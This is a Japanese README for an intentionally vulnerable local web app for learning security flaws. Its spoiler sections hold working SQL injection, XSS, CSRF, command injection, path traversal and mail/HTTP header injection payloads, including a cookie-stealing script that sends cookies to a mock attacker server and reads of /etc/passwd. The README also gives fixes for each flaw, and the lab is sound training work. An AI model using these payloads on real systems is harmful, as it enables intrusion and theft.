# vuln-lab

脆弱性を体験して学ぶための、**意図的に脆弱な** Web アプリケーションです。

> ⚠️ **ローカル学習専用です。** 絶対にインターネットへ公開したり、本番環境・他人の環境で動かさないでください。
> サーバーは `127.0.0.1` のみで待ち受けます。自分が管理していない他者のシステムへの攻撃には使わないでください。

## 方針

- 言語: Go(標準ライブラリ中心: `net/http`、`html/template`)
- DB: Cloud Spanner エミュレーター(`github.com/googleapis/go-sql-spanner` の `database/sql` ドライバー)。実際の Google Cloud には接続しない。スキーマと初期データは `sql/` の SQL ファイル(GoogleSQL)を `go:embed` で埋め込み、起動時に実行する
- 学習形式: **脆弱版のみ**。各画面に「攻撃のヒントと、なぜ危険か・本来どう直すか」の解説を載せる
- 安全策: `127.0.0.1` バインド、起動時ログと画面上の警告表示

## 体験できる脆弱性

| 脆弱性 | 画面 |
|---|---|
| SQLインジェクション | ログインフォーム `/sqli/login`、商品検索 `/sqli/search` |
| XSS(反射型) | 検索結果表示 `/xss/reflected` + 攻撃者の罠ページ `:9090/xss/` と、盗んだ Cookie の戦利品ページ `:9090/xss/loot` |
| XSS(格納型) | 掲示板コメント `/xss/board` |
| CSRF | パスワード変更/送金フォーム `/csrf/account` + 攻撃者の罠ページ(別オリジン `:9090`) |
| コマンドインジェクション | ping 画面 `/cmdi/ping` |
| パストラバーサル | ファイル閲覧画面 `/path/view`(マルチテナント越境あり) |
| メールヘッダインジェクション | お問い合わせフォーム `/mail/contact`(入力したアドレスへの自動返信メールを組み立ててプレビュー表示。devcontainer では smtp4dev に実際に送信) |
| HTTPヘッダインジェクション | リダイレクト `/header/redirect`(`http.Hijacker` で `net/http` の保護をバイパス) |

各画面には、ページ内に「攻撃のヒント」「なぜ危険か / 本来どう直すか」の解説を折りたたみで載せています。まずは解説を開かずに自力で攻撃を試し、詰まったら開いてください。

## 作業計画(段階的に進める)

各段階の完了ごとに確認を取ってから次へ進む。

- [x] 段階1: プロジェクト雛形(`go.mod`、トップページ、共通レイアウト、警告表示、localhost バインド)
- [x] 段階2: SQLインジェクション(ログイン、商品検索。DB にダミーデータ)
- [x] 段階3: XSS(反射型: 検索結果、格納型: 掲示板)
- [x] 段階4: CSRF(ログイン機能、状態変更フォーム、罠ページ)
- [x] 段階5: コマンドインジェクション(ping)とパストラバーサル(ファイル閲覧)
- [x] 段階6: 各画面の解説文、本 README への起動方法・攻撃例・対策の考え方の追記
- [x] 段階7: メールヘッダインジェクション(お問い合わせフォーム。プレビュー表示。devcontainer では smtp4dev へ実送信)
- [x] 段階8: HTTPヘッダインジェクション/レスポンス分割(`http.Hijacker` で `net/http` の保護を意図的にバイパス)

## プロジェクト構成

- `sql/`: スキーマ(`01.create-table.sql`)と初期データ(`03.organization-seed.sql`)。`go:embed` でバイナリに埋め込まれる
- `templates/`: HTML テンプレート。こちらも `go:embed` で埋め込まれるため、実行時のカレントディレクトリに依存しない
- `docs/`: パストラバーサル画面(`/path/view`)の閲覧対象。DB の初期化とは無関係

## 起動方法

DB は Cloud Spanner エミュレーターに接続する(実際の Google Cloud には接続しない)。`SPANNER_EMULATOR_HOST` が未設定、または `spanner` / `localhost` / `127.0.0.1` 以外のホストなら、起動を拒否する。

### devcontainer で起動する(推奨)

`.devcontainer/` に、アプリ用コンテナ、Cloud Spanner エミュレーター、[smtp4dev](https://github.com/rnwood/smtp4dev)(開発用SMTPサーバー)を同時に起動する設定がある。VS Code の「Dev Containers: Reopen in Container」で開き、コンテナ内で次を実行する。

```sh
go run .
```

- アプリ: http://127.0.0.1:8080/ (VS Code がポート転送する)。罠ページは http://127.0.0.1:9090/ (別モジュール `trap/` のため `go run .` では起動しない。別のターミナルで `cd trap && go run .` を実行するか、VS Code の起動構成 `Launch vuln-lab + Trap` を使う。`make` が使える環境なら `make up` で本体と同時に起動できる)
- 受信メールの確認(smtp4dev UI): http://127.0.0.1:5000/
- `SPANNER_EMULATOR_HOST=spanner:9010` と `SMTP_ADDR=smtp4dev:25` が自動で設定される
- 起動時に `sql/` のスキーマを適用し、テーブルが空なら初期データを投入する(インスタンスとデータベースはエミュレーター上に自動で作られる)
- `/mail/contact` のメールは smtp4dev に実際に送信される。smtp4dev は受信したメールを保存するだけで、外部には中継しない
- `SMTP_ADDR` のホストは `smtp4dev` / `localhost` / `127.0.0.1` に限定している(実在のSMTPサーバーへ誤って送信しないため)。未設定ならメールはプレビュー表示のみ
- SMTP(25)はコンテナ間のみ。Spanner(9010)と smtp4dev の UI(5000)はホストの `127.0.0.1` にのみ公開する

### devcontainer を使わずに起動する

エミュレーターだけをコンテナで起動し、ホストから `go run .` する。`Makefile` に起動用のターゲットがある(`SPANNER_EMULATOR_HOST` は未設定なら `127.0.0.1:9010` を使う)。

```sh
make emulator   # Spanner エミュレーターを起動(Docker が必要)
make up         # 本体(8080)と罠サーバー(9090)を同時に起動。Ctrl-C で両方止まる
```

| ターゲット | 内容 |
|---|---|
| `make up` | 本体と罠サーバーを同時に起動する。どちらかが終了したら、もう一方も止める |
| `make run` | 本体のみ起動する |
| `make trap` | 罠サーバーのみ起動する |
| `make emulator` / `make emulator-down` | Spanner エミュレーターを起動 / 停止する |
| `make vet` | 本体と `trap/` の両方で `go vet` を実行する |

`make` を使わない場合は、次のとおり。罠サーバーは別モジュール(`trap/`)なので、別のターミナルで起動する。

```sh
docker compose -f .devcontainer/docker-compose.yml up -d spanner
SPANNER_EMULATOR_HOST=127.0.0.1:9010 go run .
cd trap && go run .   # 別のターミナルで
```

この方法ではメールは `SMTP_ADDR` が未設定なのでプレビュー表示のみ。メールの実送信も試す場合は devcontainer を使う(smtp4dev の SMTP ポートはホストに公開していないため)。

現在のページ:
- `/`(トップ)
- `/sqli/login`(SQLインジェクション: ログイン)
- `/sqli/search`(SQLインジェクション: 商品検索)
- `/xss/reflected`(XSS: 反射型)
- `/xss/board`(XSS: 格納型の掲示板。「初期状態に戻す」ボタンあり)
- `/csrf/login`(CSRF: ログイン。`alice` / `password1` など)
- `/csrf/account`(CSRF: パスワード変更・送金フォーム。「初期状態に戻す」ボタンあり)
- 罠ページ: http://127.0.0.1:9090/ (攻撃者サイト役。別モジュール `trap/` のため、`go run .` では起動しない。`cd trap && go run .` で別途起動するか、`make up` や VS Code の `Launch vuln-lab + Trap` で本体と同時に起動する)
  - 反射型XSSの罠: http://127.0.0.1:9090/xss/ (被害者に踏ませるリンク)
  - 戦利品: http://127.0.0.1:9090/xss/loot (盗み出された Cookie を新しい順に表示。3秒ごとに自動更新。メモリ上のみで、罠サーバーの再起動で消える)
- `/cmdi/ping`(コマンドインジェクション: ping。実際にシェルを実行する)
- `/path/view`(パストラバーサル: `docs/` 配下のファイル閲覧)
- `/mail/contact`(メールヘッダインジェクション: お問い合わせフォーム。`SMTP_ADDR` 設定時のみ smtp4dev に実送信、未設定ならプレビューのみ)
- `/header/redirect`(HTTPヘッダインジェクション: リダイレクト。`http.Hijacker` で生のレスポンスを組み立てる)

XSS の画面では、盗み出す対象として `HttpOnly` なしのデモ用 Cookie(`demo_session`)を発行します。

### データを初期状態に戻す

攻撃を試した結果、画面が壊れたりデータが変わったりしても、次の方法で初期状態に戻せます。

- 全体をまとめてリセット: エミュレーターのコンテナを再起動する(データはメモリ上だけなので消える)。続けてアプリを再起動すると初期データが入る(最も確実)
- 掲示板のみ: `/xss/board` の「掲示板を初期状態に戻す」ボタン
- CSRFの残高・パスワードのみ: `/csrf/account` の「残高とパスワードを初期状態に戻す」ボタン(`/sqli/login` の `admin` 等のパスワードも一緒に戻る)

## 攻撃例(ネタバレ。まず自力で試してみてください)

<details>
<summary>SQLインジェクションの答え</summary>

**ログイン(`/sqli/login`)**
- 認証回避: ユーザー名 `admin'--`、パスワードは任意(`--` 以降がコメントになりパスワード条件が消える)
- 認証回避: ユーザー名は任意、パスワード `' OR '1'='1`(条件が常に真になる)
- エラー誘発: ユーザー名 `'`(DBエラーが画面に表示される)

**商品検索(`/sqli/search`)**
- 非公開商品の閲覧: `' OR 1=1 --`
- 他テーブルの窃取(UNION): `zzz' UNION ALL SELECT id, username, password, 0 FROM accounts --`(Spanner は `UNION ALL` / `UNION DISTINCT` が必須で、列の型も合わせる。`role`(文字列)を4列目に置くと型の不一致でエラーになる)
- テーブル構造の調査: `zzz' UNION ALL SELECT 1, table_name, column_name, 0 FROM information_schema.columns WHERE table_schema = '' --`

**本来の対策**: プレースホルダ(`?`)でバインドする。パスワードはハッシュ化して保存する。DBエラーは画面に出さずログへ。DBユーザーの権限を最小化する。

</details>

<details>
<summary>XSS の答え</summary>

**反射型(`/xss/reflected`)**
- キーワードに `<script>alert(1)</script>` または `<img src=x onerror=alert(1)>`
- Cookie の表示: `<img src=x onerror=alert(document.cookie)>`
- URL に細工して他人に開かせる: `/xss/reflected?q=<URLエンコードしたペイロード>`
- Cookie を攻撃者サーバーへ送る: 別タブで http://127.0.0.1:9090/xss/loot を開いたまま、http://127.0.0.1:9090/xss/ の「景品を受け取る」を踏むと、`demo_session` が戦利品ページに表示される(事前に標的サイトを開く必要はない)

**格納型(`/xss/board`)**
- 本文に `<script>alert('stored')</script>` を投稿し、再読み込みする(名前欄も同様)
- Cookie を攻撃者サーバーへ送る: 別タブで http://127.0.0.1:9090/xss/loot を開いたまま、本文に `<img src=x onerror="new Image().src='http://127.0.0.1:9090/xss/steal?c='+encodeURIComponent(document.cookie)">` を投稿し、掲示板を開き直す(画面の「Cookieを攻撃者サーバーへ送る」ボタンで入力できる)。リンクを踏ませなくても、掲示板を開いた人全員の `demo_session` が戦利品ページに並ぶ
- ページが操作不能になったら「掲示板を初期状態に戻す」を押す

**本来の対策**: 出力時にエスケープする(`html/template` に文字列のまま渡し、`template.HTML` へ変換しない)。Cookie に `HttpOnly` を付ける。`Content-Security-Policy` を設定する。HTMLを許可する場合は許可リスト方式のサニタイザを使う。

</details>

<details>
<summary>CSRF の答え</summary>

1. `/csrf/login` で `alice` / `password1` としてログインする(ログインしたままにする)。
2. 同じブラウザの別タブで http://127.0.0.1:9090/ を開く。
3. 「プレゼントを受け取る」: 自動送信フォームが `/csrf/transfer` に POST され、alice から bob へ 30000 円が送金される。
4. 「アンケートに答える」: `/csrf/password` に POST され、alice のパスワードが `hacked` に変わる。
5. `/csrf/account` を再読み込みして残高を確認する。パスワードは再ログインで確認する。

罠ページと本体は別オリジン(ポートが違う)だが、`127.0.0.1` は同一サイトなので `SameSite=Lax` 既定でも Cookie が送られる。

**本来の対策**: CSRFトークンをフォームに埋め込んで検証する。`SameSite=Lax/Strict` を指定する。`Origin` / `Referer` を検証する。重要操作では現在のパスワードの再入力(再認証)を求める。

</details>

<details>
<summary>コマンドインジェクションとパストラバーサルの答え</summary>

**コマンドインジェクション(`/cmdi/ping`)**
- ホストに `127.0.0.1; id`(`;` で別のコマンドを続ける)
- ホストに `127.0.0.1 && ls`
- ホストに `$(whoami)`(シェルが先に評価する)

**パストラバーサル(`/path/view`)**
- マルチテナント構成の模擬: 自組織(株式会社アルファ、`docs/org1/`)から、他組織(ベータ合同会社)のディレクトリへ
  - `../org2/welcome.txt`
  - `../org2/contract.txt`(ベータ合同会社の社外秘ダミー文書)
- `../../go.mod`(`docs/` の一つ上のファイル)
- `../../secret/api_key.txt`(非公開のダミーキー)
- `../../../../../../../etc/passwd`(OS のファイル)

**本来の対策**
- コマンドインジェクション: シェルを使わず `exec.Command("ping", "-c", "1", host)` と引数を分ける。ホスト名を許可リストで検証する。
- パストラバーサル: `filepath.Clean` 後にベースディレクトリ配下か検証する。`os.Root` を使う。ファイル名を ID に対応付ける。

</details>

<details>
<summary>メールヘッダインジェクションの答え</summary>

**お問い合わせフォーム(`/mail/contact`)**
- 入力したメールアドレス宛に、サポート窓口を差出人とした自動返信が届く。他人(被害者役の `victim@example.com`)のアドレスを入れ、件名に細工すると、その人に偽のメールを届けられる
- 件名に `お問い合わせ` + 改行 + `Bcc: attacker@evil.example` を仕込むと、メールに `Bcc` ヘッダが追加される
- ブラウザの1行入力欄には改行を直接打ち込みにくいため、件名は改行を入れられる複数行の入力欄にしてある。画面の「入力例を入れる」ボタンで改行入りの例を入れて送信するか、`curl` で直接試す
  ```sh
  curl -d "name=A&email=victim%40example.com&subject=Hi%0D%0ABcc: attacker%40evil.example&body=Hello" http://127.0.0.1:8080/mail/contact
  ```
- メールアドレス欄に改行を入れると、`net/smtp` が宛先(`RCPT TO`)の検証で拒否する(`smtp: A line must not contain CR or LF`)。件名・お名前は検証されないので注入できる
- `Bcc:` を足しても、実際の配送先(SMTP の `RCPT TO`)は変わらない。smtp4dev で受信メールのヘッダに現れるだけ。代わりに、被害者に届くメールの中身を書き換える注入が確認できる(画面の「入力例を入れる」ボタン)
  - 偽の文言の差し込み: 件名に `お問い合わせ` + 改行2つ + `【重要】…` → ヘッダが終わり、続きが本文になる
  - HTMLメールへの差し替え: 件名に `Content-Type: text/html` と HTML、末尾に `<!--` → 本文が HTML になり、元の本文はコメントに隠れる
  - Reply-To の注入: 件名に `お問い合わせ` + 改行 + `Reply-To: attacker@evil.example` → 返信先が攻撃者になる

**本来の対策**: メールアドレス・件名など1行であるべき値に `\r` `\n` を含めない(含まれていれば拒否する)。`net/mail.ParseAddress` のような、ヘッダを安全に組み立てる仕組みを使い、文字列連結を避ける。

</details>

<details>
<summary>HTTPヘッダインジェクションの答え</summary>

**リダイレクト(`/header/redirect`)**
- 画面の「入力例を入れる」ボタンで `next` 欄に例を入れて「移動」を押す(欄は改行を保持できる複数行)
- `Set-Cookieを注入する`(`next=/header/redirect%0D%0ASet-Cookie: admin=true`): レスポンスに `Set-Cookie` ヘッダが追加され、画面に戻ると「ブラウザが送ってきた Cookie」に `admin=true` が現れる
- `ページ内容ごと差し替える`(`next=%0D%0AContent-Type: text/html%0D%0A%0D%0A<html>...`): `Location` を空にして追従を止め、ヘッダを終端する空行ごと注入して、続きをレスポンス本文として表示させる(ブラウザによって挙動が異なる場合がある)
- `curl -i "http://127.0.0.1:8080/header/redirect?next=%2F%0D%0ASet-Cookie%3A%20admin%3Dtrue"` で生のレスポンスを直接確認できる

Go の `net/http` は `w.Header().Set` や `http.Redirect` を使う限りこの注入を防ぐため、この画面は `http.Hijacker` で接続を乗っ取り、意図的にその保護をバイパスしている。

**本来の対策**: `http.Hijacker` で生レスポンスを自作しない(標準APIに任せる)。リダイレクト先に改行を含めない。リダイレクト先を許可リスト化する。

</details>

## 対策の考え方(共通原則)

個別の対策は各画面の解説に書いていますが、6つの脆弱性にはいくつか共通する考え方があります。

- **信頼境界をまたぐ入力はすべて疑う**: フォーム・URLパラメータ・Cookie など、利用者から来る値は、見た目が正しそうでも検証・無害化するまで信用しない。「このアプリの利用者は悪意を持たない」という前提を置かない。
- **「組み立て」ではなく「分離」で渡す**: SQL・シェルコマンド・HTML のいずれも、入力値を文字列として組み立てる(連結する)と、構文の一部として解釈されてしまう。
  - SQL → プレースホルダ(バインド変数)
  - シェルコマンド → `exec.Command` の引数配列(シェルを経由しない)
  - HTML → 自動エスケープするテンプレートエンジンにそのまま渡す(`html/template` では文字列のまま)
- **出力時にも守る(多層防御)**: 入力検証をすり抜けても被害を抑えられるよう、出力・実行の直前でも対策する(エスケープ、プレースホルダ、許可リストでのパス検証)。CSRFトークン・`SameSite` Cookie・`Content-Security-Policy` のような「もう一段の壁」を重ねる。
- **最小権限**: DBユーザーの権限、アプリの実行ユーザーの権限、Cookie の権限(`HttpOnly`)などを必要最小限にし、一つの脆弱性が突破されても被害を小さくする。
- **マルチテナントでは「自分のものか」を必ず確認する**: `/path/view` のように、組織IDからパスやキーを機械的に作るだけでは不十分。アクセスのたびに「要求されたリソースが、本当にこの利用者(テナント)の所有物か」をDB等で確認する。
- **エラー情報を外に出さない**: DBエラーやOSのエラーメッセージをそのまま画面に出すと、攻撃者に内部構造のヒントを与える。詳細はログにのみ残し、画面には一般的なメッセージを出す。
- **攻撃者視点で自分のアプリを見る**: 「この入力欄に何を入れたら、意図しない動作を起こせるか」を都度考える習慣が、脆弱性の作り込みを防ぐ最初の一歩になる。
